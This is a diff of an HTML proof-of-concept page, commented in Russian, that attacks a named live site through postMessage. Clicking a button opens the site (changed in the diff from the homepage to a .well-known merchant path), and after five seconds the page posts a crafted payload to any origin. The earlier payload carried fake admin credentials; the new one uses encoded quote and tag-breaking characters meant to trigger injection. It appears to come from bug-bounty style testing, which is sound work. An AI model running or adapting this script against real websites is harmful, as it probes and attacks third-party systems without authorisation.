@@ -2,27 +2,27 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: Exploiting postMessage Vulnerability</title>
+    <title>PoC for postMessage Injection</title>
 </head>
 <body>
-    <h1>PoC: Exploiting postMessage Vulnerability</h1>
-    <button onclick="exploit()">Run Exploit</button>
+    <h1>PoC for postMessage Injection</h1>
+    <button id="pocButton">Send Malicious Payload</button>
 
     <script>
-        function exploit() {
-            // Открываем целевой сайт в новом окне
-            var targetWindow = window.open('https://web.koho.ca');
+        function sendMaliciousPayload() {
+            // Открыть окно с целевым сайтом
+            var win = window.open('https://web.koho.ca/.well-known/apple-developer-merchantid-domain-association/');
 
-            // Определяем payload с инъекционными данными
-            var payload = `{ "key": "{\"username\":\"admin\", \"password\":\"password\"}" }`;
+            // Вредоносное сообщение, которое мы пытаемся внедрить
+            var payload = `{ "key": "tk1qujtb98%2527%2522`'\"/tk1qujtb98/><tk1qujtb98/\>b823t7k8hj&" }`;
 
-            // Отправляем payload через postMessage спустя 5 секунд после открытия сайта
+            // Отправить сообщение в открытое окно
             setTimeout(function() {
-                console.log("Sending payload to target site...");
-                targetWindow.postMessage(payload, '*');
+                win.postMessage(payload, '*');
             }, 5000);
         }
+
+        document.getElementById('pocButton').addEventListener('click', sendMaliciousPayload);
     </script>
 </body>
 </html>
